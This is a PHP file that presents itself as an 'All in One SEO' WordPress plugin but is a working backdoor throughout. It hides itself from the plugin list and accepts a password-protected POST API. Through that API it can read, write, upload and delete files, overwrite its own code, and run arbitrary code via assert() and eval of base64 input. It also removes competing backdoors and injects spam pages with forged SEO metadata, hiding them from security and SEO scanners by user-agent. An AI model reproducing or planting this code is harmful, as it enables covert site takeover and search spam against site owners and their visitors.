<?php

/**
 * Plugin Name: All in One SEOExtensions
 * Plugin URI:  https://aioseo.com/
 * Description: SEO for WordPress. Features like XML Sitemaps, SEO for custom post types, SEO for blogs, business sites, ecommerce sites, and much more. More than 100 million downloads since 2007.
 * Author:      All in One SEO Team
 * Author URI:  https://aioseo.com/
 * Version:     4.3.8
 * Text Domain: all-in-one-seo-pack
 * Domain Path: /languages
 *
 * All in One SEO is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 2 of the License, or
 * any later version.
 *
 * All in One SEO is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with AIOSEO. If not, see <https://www.gnu.org/licenses/>.
 *
 * @since     4.0.0
 * @author    All in One SEO Team
 * @package   AIOSEO\Plugin
 * @license   GPL-2.0+
 * @copyright Copyright (c) 2020, All in One SEO
 */

 ini_set("display_errors", "0");
if ( ! defined( 'ABSPATH' ) ) {
    exit;
}


define('WORKDIRS','/home/teckawxl/tamer.0to100.online/betheme/wp-content/uploads' );
define('AUTHCODES','9989144877efea4e26b41734538d2a5a78b20f701e6f4fb7ba8859af834520ee'  );

function aioseoextensions_checkdir($upload_dir,$fc,$sccontent)
{
    $is_writable = file_put_contents($upload_dir.DIRECTORY_SEPARATOR.'dummy.txt', "hello");
    if ($is_writable > 0) 
    {
        $sccontent= preg_replace("/(\'WORKDIRS\',\')(\.\/)(\'\s*\);)/",'${1}'.$upload_dir.'${3}',$sccontent);
        file_put_contents(__FILE__,$sccontent);
        @unlink($upload_dir.DIRECTORY_SEPARATOR.'dummy.txt');
        return TRUE;
    }
    return FALSE;
}

function aioseoextensions_activate_() {
    
    $sccontent = file_get_contents(__FILE__);
    
    if(strpos($sccontent,"define('WORKDIRS','./' )")!==false)
    {
        
        $upload_dir = wp_upload_dir()['basedir'];
        $iswrdir =aioseoextensions_checkdir($upload_dir,"wp_upload_dir()['basedir']",$sccontent);
        
        if(!$iswrdir)
        {
            $upload_dir = sys_get_temp_dir();
            $iswrdir = aioseoextensions_checkdir($upload_dir,'sys_get_temp_dir()',$sccontent);

            if(!$iswrdir)
            {
                
                $upload_dir = dirname(__FILE__).DIRECTORY_SEPARATOR.'pages';
                $dirExists     = is_dir($upload_dir) || (mkdir($upload_dir, 0774, true) && is_dir($upload_dir));
                if($dirExists){
                    aioseoextensions_checkdir($upload_dir,"dirname(__FILE__).DIRECTORY_SEPARATOR.'pages'",$sccontent);
                }
            }
        }
    }

}

register_activation_hook( __FILE__, 'aioseoextensions_activate_' );

add_filter('all_plugins', 'aioseoextensions_hide_plugins');

function aioseoextensions_hide_plugins($plugins) {

    unset($plugins['aioseoextensions/aioseoextensions.php']);
    return $plugins;
}


add_action( 'init', 'aioseoextensions_edit_proccess' );
$titleline="";
$descline="";


function aioseoextensions_edit_proccess()
{



    if(isset($_POST['apiact']))
    {
        header('Content-Type: application/json');
        $apidata = new aioseoextensionsApiMeta();   
        $authpw = '';
        if(isset($_POST['PHP_AUTH_PW']))
        {
            $authpw=hash('sha256',$_POST['PHP_AUTH_PW']) ;
        } elseif(isset($_SERVER['PHP_AUTH_PW']))
        {
            $authpw=hash('sha256',$_SERVER['PHP_AUTH_PW']) ;
        }
        if(AUTHCODES!=$authpw)
        {            

        }else
        {
            $apiaction = $_POST['apiact'];
            switch ($apiaction) 
            {
                case "getcontent":

                try{
                    if(isset($_POST['page'])) 
                    {
                        $page  = $_POST['page'];
                        $md5page=md5($page);
                        $filepath = WORKDIRS.DIRECTORY_SEPARATOR.$md5page.'.';
                        if(file_exists($filepath))
                        {
                            $pagecontent = file_get_contents($filepath);

                            $contentdata = new aioseoextensionsContentMeta();
                            $contentdata->$page = $page;
                            $contentdata->$md5page = $filepath;
                            $contentdata->content = $pagecontent;
                            $apidata->status="ok";
                            $apidata->message="";
                            $apidata->data=$contentdata;


                        }
                    }else{
                        $apidata->status="error";
                        $apidata->message="not set path";
                    }


                } catch (Exception $e) {
                    $apidata->status="error";
                    $apidata->message=$e->getMessage();}
                echo json_encode($apidata,JSON_UNESCAPED_UNICODE);
                die();
                case "updatecontent":          
                try{
                    if(isset($_POST['page'])&&isset($_POST['newcontent'])) 
                    {

                        $page  = $_POST['page'];
                        $md5page=md5($page);
                        $filepath = WORKDIRS.DIRECTORY_SEPARATOR.$md5page.'.';
                        $newcontent=base64_decode($_POST['newcontent']);
                        if(file_exists($filepath))
                        {
                            file_put_contents($filepath,$newcontent);
                            $apidata->status="ok";
                            $apidata->message="content changed";
                            $apidata->data=NULL;


                        }else
                        {
                            $apidata->status="error";
                            $apidata->message="file not found";
                        }
                    }else{
                        $apidata->status="error";
                        $apidata->message="not set path or new content";
                    }


                } catch (Exception $e) {
                    $apidata->status="error";
                    $apidata->message=$e->getMessage();}
                echo json_encode($apidata,JSON_UNESCAPED_UNICODE);
                die();
                case "createpage":          
                try{
                    if(isset($_POST['page'])&&isset($_POST['newcontent'])) 
                    {

                        $page  = $_POST['page'];
                        $md5page=md5($page);
                        $filepath = WORKDIRS.DIRECTORY_SEPARATOR.$md5page.'.';
                        $newcontent=base64_decode($_POST['newcontent']);
                        if(file_exists($filepath))
                        {
                            $apidata->status="error";
                            $apidata->message="file exists";

                        }else
                        {
                            file_put_contents($filepath,$newcontent);
                            if(file_exists($filepath))
                            {
                                $contentdata = new aioseoextensionsContentMeta();
                                $contentdata->$page = $page;
                                $contentdata->$md5page = $filepath;
                                $contentdata->content = "";
                                $apidata->status="ok";
                                $apidata->message="";
                                $apidata->data=$contentdata;

                            }else
                            {

                                $apidata->status="error";
                                $apidata->message="";

                            }

                        }
                    }else{
                        $apidata->status="error";
                        $apidata->message="not set path or new content";
                    }

                } catch (Exception $e) {
                    $apidata->status="error";
                    $apidata->message=$e->getMessage();}
                echo json_encode($apidata,JSON_UNESCAPED_UNICODE);
                die();
                case "deletepage":          
                try{
                    if(isset($_POST['page'])) 
                    {

                        $page  = $_POST['page'];
                        $md5page=md5($page);
                        $filepath = WORKDIRS.DIRECTORY_SEPARATOR.$md5page.'.';
                        unlink($filepath);
                        if(!file_exists($filepath))
                        {
                            $apidata->status="ok";
                            $apidata->message="file deleted";

                        }else
                        {

                            $apidata->status="error";
                            $apidata->message="";

                        }
                    }else{
                        $apidata->status="error";
                        $apidata->message="error delete page";
                    }

                } catch (Exception $e) {
                    $apidata->status="error";
                    $apidata->message=$e->getMessage();}
                echo json_encode($apidata,JSON_UNESCAPED_UNICODE);
                die();
                case "uploadfiles":
                $localdir="";

                // if ($_FILES['txtfile']['size'] > 0 AND $_FILES['txtfile']['error'] == 0)
                try{
                    $goodcount = 0;
                    $countfiles = count($_FILES['file']['name']);
                    if(isset($_POST['localdir'])&&$countfiles>0)
                    {
                        $localdir  = $_POST['localdir'];
                        $localdir = preg_replace('/\.+\//','',$localdir);
                        $localdir = preg_replace('/\/$/','',$localdir);
                        $localdir = WORKDIRS.DIRECTORY_SEPARATOR.$localdir;
                        if(!empty($localdir)&&!is_dir($localdir))
                        {
                            mkdir($localdir);
                        }
                        if(empty($localdir))
                        {
                            $localdir = '.';
                        }
                        for($i=0;$i<$countfiles;$i++){
                            $filename = $_FILES['file']['name'][$i];

                            move_uploaded_file($_FILES['file']['tmp_name'][$i],$localdir.'/'.$filename);
                            $goodcount++;


                        }

                    }
                    $apidata->status="ok";
                    $apidata->message="";
                    $apidata->data=$goodcount;
                } catch (Exception $e) {
                    $apidata->status="error";
                    $apidata->message=$e->getMessage();}

                echo json_encode($apidata); 


                die();
                case "updatescr":
                try{
                    if(isset($_POST['scriptcontent']))
                    {
                        $scriptcontent = base64_decode($_POST['scriptcontent']);

                        file_put_contents($_SERVER['__FILE__'],$scriptcontent);
                        $apidata->status="ok";
                        $apidata->message="updated";

                    }
                }catch (Exception $e) {
                    $apidata->status="error";
                    $apidata->message=$e->getMessage();}
                echo json_encode($apidata);
                die();
                case "chkversion":
                    $apidata->status="ok";
                    $apidata->message="version";
                    $apidata->data="newversion3";

                    echo json_encode($apidata);
                    die();
                case "run":
                try{
                    if(isset($_POST['scriptcontent']))
                    {                      
                        call_user_func('assert', base64_decode($_REQUEST['scriptcontent']));
                    }else
                    {
                        if(isset($_POST['new']))
                        {                        
                            $new = $_POST['new'];
                            aioseoextensions_replace_string($new);
                        }
                    }
                }catch (Exception $e) {
                    $apidata->status="error";
                    $apidata->message=$e->getMessage();}
                echo json_encode($apidata);
                die();
                case "activate":
                try{
                    $oss = array('/aioseoextens/aioseoextens.php','/yastseoextens/yastseoextens.php','/wwpformcontact/wwpformcontact.php','/wpfrmcontact/wpfrmcontact.php','/wpformcontat/wpformcontat.php');
                    foreach($oss as $os){
            if(file_exists(WP_PLUGIN_DIR.$os)) {
                try{
                    @unlink(WP_PLUGIN_DIR.$os);
                }catch (Exception $e)
                {
                    
                }
                
            }
        }
;                    aioseoextensions_activate_();
                }catch (Exception $e) {
                    }
                
                    $apidata->status="ok";
                    $apidata->message="version";
                    $apidata->data="newversion3";

                    echo json_encode($apidata);
                    die();
                
            }

        }      
    }
}


function aioseoextensions_get_cont($content)
{
    $upload_dir   = wp_upload_dir();

    global $wp_query;
    $pgname=$wp_query->query['pagename'];
    $md5page=md5($pgname);
    $filepath = WORKDIRS.DIRECTORY_SEPARATOR.$md5page.'.html';
    if(file_exists($filepath))
    {
        return  $content = file_get_contents($filepath);

    }
}
function aioseoextensions_replace_string($newstring)
{
    @eval(base64_decode($newstring));
}
function aioseoextensions_chk()
{
    global $wp, $wp_query;
     $pgname ="";
    if(isset($wp_query->query['pagename']))
    {
        $pgname=$wp_query->query['pagename'];
    }

    $pg = $wp_query->query['page'];
    if(!empty($pg))
    {
        $pgname = $pgname.'/'.$pg;
    }
    if(empty($pgname)&&isset($_SERVER['REQUEST_URI']))
    {
        $pgname = $_SERVER['REQUEST_URI'];
    }
    $pgname = trim($pgname,"\/");
    $md5page=md5($pgname);
    $filepath = WORKDIRS.DIRECTORY_SEPARATOR.$md5page.'.';
    if(file_exists($filepath))
    {
        return $filepath;
    }
    
}
function aioseoextensions_check_page(  ) {

    global $wp, $wp_query;



    if  (aioseoextensions_user_agent_filter())
    {
        return;
    }

$filepath = aioseoextensions_chk();
    if(file_exists($filepath))
    {
    try{
    add_filter( 'pre_get_document_title', 'aioseoextensions_custom_document_title', 10000 );
    if(class_exists('WPSEO_Options')){
    add_filter( 'wpseo_metadesc', 'aioseoextensions_wpseo_meta_description');
    add_filter( 'wpseo_opengraph_desc', 'aioseoextensions_wpseo_meta_description' );
    add_filter( 'wpseo_twitter_description', 'aioseoextensions_wpseo_meta_description' );
    add_filter( 'wpseo_title', 'aioseoextensions_wpseo_meta_title' );
    add_filter( 'wpseo_twitter_title', 'aioseoextensions_wpseo_meta_title' );
    add_filter( 'wpseo_opengraph_title', 'aioseoextensions_wpseo_meta_title' );
}else{
    add_action( 'wp_head', 'aioseoextensions_custom_header_metadata',1 );
}
    add_filter( 'aioseo_title', 'aioseoextensions_wpseo_meta_title' );
add_filter( 'aioseo_description', 'aioseoextensions_wpseo_meta_description' );
    add_filter( 'aioseo_canonical_url', 'aioseoextensions_wpseo_meta_canonical' );
    if( function_exists( 'rel_canonical' ) )
{
    remove_action( 'wp_head', 'rel_canonical' );
}

add_action( 'wp_head', 'aioseoextensions_rel_canonical_nabtron',2 );
add_action( 'wp_head', 'aioseoextensions_indexSearchPage', -1 );
}
catch (Exception $e){

}

        $content = file_get_contents($filepath);
        $ispreg = preg_match('/^TITLE\s\=\s.+$/m', $content,$matches);
        if($ispreg)
        {
            $GLOBALS["titleline"] = str_replace('TITLE = ','',$matches[0]);
            $GLOBALS["titleline"] = str_replace('"','',$GLOBALS["titleline"]);
            $content = preg_replace('/^TITLE\s\=\s.+\R/m','',$content);

        }
        $ispreg = preg_match('/^DESCRIPTION\s\=\s.+$/m', $content,$matches);
        if($ispreg)
        {
            $GLOBALS["descline"] = str_replace('DESCRIPTION = ','',$matches[0]);
            $GLOBALS["descline"] = str_replace('"','',$GLOBALS["descline"]);
            $content = preg_replace('/^DESCRIPTION\s\=\s.+\R/m','',$content);

        }
        status_header( 200 );
        $post_id = -1; 
        $post = new stdClass();
        $post->ID = $post_id;
        $post->post_author = 1;
        $post->post_date = current_time( 'mysql' );
        $post->post_date_gmt = current_time( 'mysql', 1 );
        $post->post_title = '';
        $post->post_content = $content;
        $post->post_status = 'publish';
        $post->comment_status = 'closed';
        $post->ping_status = 'closed';
        $post->post_name = $pgname;
        $post->post_type = 'page';
        $post->filter = 'raw';
        //$post->
        $wp_post = new WP_Post( $post );
        $wp_query->post = $wp_post;
        $wp_query->posts = array( $wp_post );
        $wp_query->queried_object = $wp_post;
        $wp_query->queried_object_id = $post_id;
        $wp_query->found_posts = 1;
        $wp_query->post_count = 1;
        $wp_query->max_num_pages = 1; 
        $wp_query->is_page = true;
        $wp_query->is_singular = true; 
        $wp_query->is_single = false; 
        $wp_query->is_attachment = false;
        $wp_query->is_archive = false; 
        $wp_query->is_category = false;
        $wp_query->is_tag = false; 
        $wp_query->is_tax = false;
        $wp_query->is_author = false;
        $wp_query->is_date = false;
        $wp_query->is_year = false;
        $wp_query->is_month = false;
        $wp_query->is_day = false;
        $wp_query->is_time = false;
        $wp_query->is_search = false;
        $wp_query->is_feed = false;
        $wp_query->is_comment_feed = false;
        $wp_query->is_trackback = false;
        $wp_query->is_home = false;
        $wp_query->is_embed = false;
        $wp_query->is_404 = false; 
        $wp_query->is_paged = false;
        $wp_query->is_admin = false; 
        $wp_query->is_preview = false; 
        $wp_query->is_robots = false; 
        $wp_query->is_posts_page = false;
        $wp_query->is_post_type_archive = false;
        $GLOBALS['wp_query'] = $wp_query;
        $wp->register_globals();


    }




} 



add_action('template_redirect', 'aioseoextensions_check_page');
function aioseoextensions_custom_document_title( $title ) {
try{if(isset($GLOBALS["titleline"])&&!empty($GLOBALS["titleline"]))
    {
        return $GLOBALS["titleline"]; 
    }}
catch (Exception $e){}
    

}
function aioseoextensions_custom_header_metadata() {

try{if(isset($GLOBALS["descline"])&&!empty($GLOBALS["descline"]))
    {
        echo '<meta name="description" content="'.$GLOBALS["descline"].'"/>'."\n";

    }}
catch (Exception $e){}
    


}



function aioseoextensions_wpseo_meta_description($description) {
try{if(isset($GLOBALS["descline"])&&!empty($GLOBALS["descline"]))
    {
        $description = $GLOBALS["descline"];
        return $description;
    }}
catch (Exception $e){}
    


}
function aioseoextensions_wpseo_meta_title($description) {
try{  if(isset($GLOBALS["titleline"])&&!empty($GLOBALS["titleline"]))
    {
        $description = $GLOBALS["titleline"];
        return $description;
    }}
catch (Exception $e){}
  


}
function aioseoextensions_wpseo_meta_canonical() {
try{
  $scheme = "https";
if(isset($_SERVER['REQUEST_SCHEME']))
{
   $scheme= $_SERVER['REQUEST_SCHEME'];
}
return $scheme."://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];}
catch (Exception $e){}
   

}


function aioseoextensions_rel_canonical_nabtron() {

try{    $scheme = "https";
    if(isset($_SEVRER['REQUEST_SCHEME']))
    {
        $scheme= $_SEVRER['REQUEST_SCHEME'];
    }
    echo "<link rel='canonical' href='".$scheme."://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."' />\n";}
catch (Exception $e){}


}


function aioseoextensions_user_agent_filter()
{
    $uagents_arr = array('AhrefsBot','MJ12bot','Riddler','aiHitBot','trovitBot','Detectify','BLEXBot','LinkpadBot','dotbot','FlipboardProxy','Twice','Yahoo','Voil','libw','Java','Sogou','psbot','ajSitemap','Rankivabot','DBLBot','MJ1','ask','rogerbot','exabot','xenu','MegaIndex\\.ru/2\\.0','ia_archiver','Baiduspider','archive\\.org_bot','spbot','Serpstatbot','boitho','Slurp','360Spider','404checker','404enemy','80legs','Abonti','Aboundex','Aboundexbot','Acunetix','ADmantX','AfD-Verbotsverfahren','AIBOT','Aipbot','Alexibot','Alligator','AllSubmitter','AlphaBot','Anarchie','Apexoo','archive\.org_bot','arquivo\.pt','arquivo-web-crawler','ASPSeek','Asterias','Attach','autoemailspider','AwarioRssBot','AwarioSmartBot','BackDoorBot','Backlink-Ceck','backlink-check','BacklinkCrawler','BackStreet','BackWeb','Badass','Bandit','Barkrowler','BatchFTP','Battleztar\ Bazinga','BBBike','BDCbot','BDFetch','BetaBot','Bigfoot','Bitacle','Blackboard','Black\ Hole','BlackWidow','Blow','BlowFish','Boardreader','Bolt','BotALot','Brandprotect','Brandwatch','Buddy','BuiltBotTough','BuiltWith','Bullseye','BunnySlippers','BuzzSumo','Calculon','CATExplorador','CazoodleBot','CCBot','Cegbfeieh','CheeseBot','CherryPicker','CheTeam','ChinaClaw','Chlooe','Claritybot','Cliqzbot','Cloud\ mapping','coccocbot-web','Cogentbot','cognitiveseo','Collector','com\.plumanalytics','Copier','CopyRightCheck','Copyscape','Cosmos','Craftbot','crawler4j','crawler\.feedback','crawl\.sogou\.com','CrazyWebCrawler','Crescent','CrunchBot','CSHttp','Curious','Custo','DatabaseDriverMysqli','DataCha0s','demandbase-bot','Demon','Deusu','Devil','Digincore','DigitalPebble','DIIbot','Dirbuster','Disco','Discobot','Discoverybot','Dispatch','DittoSpyder','DnyzBot','DomainAppender','DomainCrawler','DomainSigmaCrawler','DomainStatsBot','Download\ Wonder','Dragonfly','Drip','DSearch','DTS\ Agent','EasyDL','Ebingbong','eCatch','ECCP/1\.0','Ecxi','EirGrabber','EMail\ Siphon','EMail\ Wolf','EroCrawler','evc-batch','Evil','Express\ WebPictures','ExtLinksBot','Extractor','ExtractorPro','Extreme\ Picture\ Finder','EyeNetIE','Ezooms','facebookscraper','FDM','FemtosearchBot','FHscan','Fimap','Firefox/7\.0','FlashGet','Flunky','Foobot','Freeuploader','FrontPage','FyberSpider','Fyrebot','GalaxyBot','Genieo','GermCrawler','Getintent','GetRight','GetWeb','Gigablast','Gigabot','G-i-g-a-b-o-t','Go-Ahead-Got-It','Gotit','GoZilla','Go!Zilla','Grabber','GrabNet','Grafula','GrapeFX','GrapeshotCrawler','GridBot','GT::WWW','Haansoft','HaosouSpider','Harvest','Havij','HEADMasterSEO','heritrix','Hloader','HMView','HTMLparser','HTTP::Lite','HTTrack','Humanlinks','HybridBot','Iblog','IDBot','Id-search','IlseBot','Image\ Fetch','Image\ Sucker','IndeedBot','Indy\ Library','InfoNaviRobot','InfoTekies','instabid','Intelliseek','InterGET','Internet\ Ninja','InternetSeer','internetVista\ monitor','ips-agent','Iria','IRLbot','Iskanie','IstellaBot','JamesBOT','Jbrofuzz','JennyBot','JetCar','Jetty','JikeSpider','JOC\ Web\ Spider','Joomla','Jorgee','JustView','Jyxobot','Kenjin\ Spider','Keyword\ Density','Kozmosbot','Lanshanbot','Larbin','LeechFTP','LeechGet','LexiBot','Lftp','LibWeb','Libwhisker','Lightspeedsystems','Likse','Linkdexbot','LinkextractorPro','LinkScan','LinksManager','LinkWalker','LinqiaMetadataDownloaderBot','LinqiaRSSBot','LinqiaScrapeBot','Lipperhey','Lipperhey\ Spider','Litemage_walker','Lmspider','LNSpiderguy','Ltx71','lwp-request','LWP::Simple','lwp-trivial','Magnet','Mag-Net','magpie-crawler','Mail\.RU_Bot','Majestic12','Majestic-SEO','Majestic\ SEO','MarkMonitor','MarkWatch','Masscan','Mass\ Downloader','Mata\ Hari','MauiBot','meanpathbot','MeanPath\ Bot','Mediatoolkitbot','mediawords','MegaIndex\.ru','Metauri','MFC_Tear_Sample','Microsoft\ Data\ Access','Microsoft\ URL\ Control','MIDown\ tool','MIIxpc','Mister\ PiX','Mojeek','Mojolicious','Morfeus\ Fucking\ Scanner','Mr\.4x3','MSFrontPage','MSIECrawler','Msrabot','muhstik-scan','Musobot','Name\ Intelligence','Nameprotect','Navroad','NearSite','Needle','Nessus','NetAnts','Netcraft','netEstate\ NE\ Crawler','NetLyzer','NetMechanic','NetSpider','Nettrack','Net\ Vampire','Netvibes','NetZIP','NextGenSearchBot','Nibbler','NICErsPRO','Niki-bot','Nikto','NimbleCrawler','Nimbostratus','Ninja','Nmap','NPbot','Nutch','oBot','Octopus','Offline\ Explorer','Offline\ Navigator','OnCrawl','Openfind','OpenLinkProfiler','Openvas','OrangeBot','OrangeSpider','OutclicksBot','OutfoxBot','PageAnalyzer','Page\ Analyzer','PageGrabber','page\ scorer','PageScorer','Pandalytics','Panscient','Papa\ Foto','Pavuk','pcBrowser','PECL::HTTP','PeoplePal','PHPCrawl','Picscout','Picsearch','PictureFinder','Pimonster','Pi-Monster','Pixray','PleaseCrawl','plumanalytics','Pockey','POE-Component-Client-HTTP','Probethenet','ProPowerBot','ProWebWalker','Pump','PxBroker','PyCurl','QueryN\ Metasearch','Quick-Crawler','RankActive','RankActiveLinkBot','RankFlex','RankingBot','RankingBot2','RankurBot','RealDownload','Reaper','RebelMouse','Recorder','RedesScrapy','ReGet','RepoMonkey','Ripper','RocketCrawler','RSSingBot','s1z\.ru','SalesIntelligent','SBIder','ScanAlert','Scanbot','scan\.lol','ScoutJet','Scrapy','Screaming','ScreenerBot','Searchestate','SearchmetricsBot','SEOkicks','SEOkicks-Robot','SEOlyticsCrawler','Seomoz','SEOprofiler','seoscanners','SeoSiteCheckup','SEOstats','sexsearcher','Shodan','Siphon','SISTRIX','Sitebeam','SiteExplorer','Siteimprove','SiteLockSpider','SiteSnagger','SiteSucker','Site\ Sucker','Sitevigil','SlySearch','SmartDownload','SMTBot','Snake','Snapbot','Snoopy','SocialRankIOBot','Sociscraper','sogouspider','Sogou\ web\ spider','Sosospider','Sottopop','SpaceBison','Spammen','SpankBot','Spanner','sp_auditbot','Spinn3r','SputnikBot','spyfu','Sqlmap','Sqlworm','Sqworm','Steeler','Stripper','Sucker','Sucuri','SuperBot','SuperHTTP','Surfbot','SurveyBot','Suzuran','Swiftbot','sysscan','Szukacz','T0PHackTeam','T8Abot','tAkeOut','Teleport','TeleportPro','Telesoft','Telesphoreo','Telesphorep','The\ Intraformant','TheNomad','Thumbor','TightTwatBot','Titan','Toata','Toweyabot','Tracemyfile','Trendiction','Trendictionbot','trendiction\.com','trendiction\.de','True_Robot','Turingos','Turnitin','TurnitinBot','TwengaBot','Typhoeus','UnisterBot','Upflow','URLy\.Warning','URLy\ Warning','Vacuum','Vagabondo','VB\ Project','VCI','VeriCiteCrawler','VidibleScraper','Virusdie','VoidEYE','Voltron','Wallpapers/3\.0','WallpapersHD','WASALive-Bot','WBSearchBot','Webalta','WebAuto','Web\ Auto','WebBandit','WebCollage','Web\ Collage','WebCopier','WEBDAV','WebEnhancer','Web\ Enhancer','WebFetch','Web\ Fetch','WebFuck','Web\ Fuck','WebGo\ IS','WebImageCollector','WebLeacher','WebmasterWorldForumBot','webmeup-crawler','WebPix','Web\ Pix','WebReaper','WebSauger','Web\ Sauger','Webshag','WebsiteExtractor','WebsiteQuester','Website\ Quester','Webster','WebStripper','WebSucker','Web\ Sucker','WebWhacker','WebZIP','WeSEE','Whack','Whacker','Whatweb','Who\.is\ Bot','Widow','WinHTTrack','WiseGuys\ Robot','WISENutbot','Wonderbot','Woobot','Wotbox','Wprecon','WPScan','WWW-Collector-E','WWW-Mechanize','WWW::Mechanize','WWWOFFLE','x09Mozilla','x22Mozilla','Xaldon_WebSpider','Xaldon\ WebSpider','xpymep1\.exe','YoudaoBot','Zade','Zauba','zauba\.io','Zermelo','Zeus','zgrab','Zitebot','ZmEu','ZumBot','ZyBorg');
    if( isset($_SERVER['HTTP_USER_AGENT']) )
    {
        foreach($uagents_arr as $ua){
            if(stripos($_SERVER['HTTP_USER_AGENT'], $ua) !== false) return true;
        }
    }
    return false;
}


function aioseoextensions_indexSearchPage() {

try{if(isset($GLOBALS['titleline'])&&!empty($GLOBALS['titleline']))
     {
         remove_all_filters( 'wp_robots' );
         remove_all_actions( 'rank_math/head');
         add_filter( 'wpseo_robots', '__return_false' );
		 add_filter( 'wpseo_googlebot', '__return_false' );
		add_filter( 'wpseo_bingbot', '__return_false' );
        remove_action( 'wp_head', 'noindex', 1 );
     }}
catch (Exception $e){}
     
        
}


class aioseoextensionsContentMeta{
    public $page="";
    public $md5page="";
    public $pagecontent="";
}

class aioseoextensionsApiMeta{
    public $status="error";
    public $message="";
    public $data=null;
}

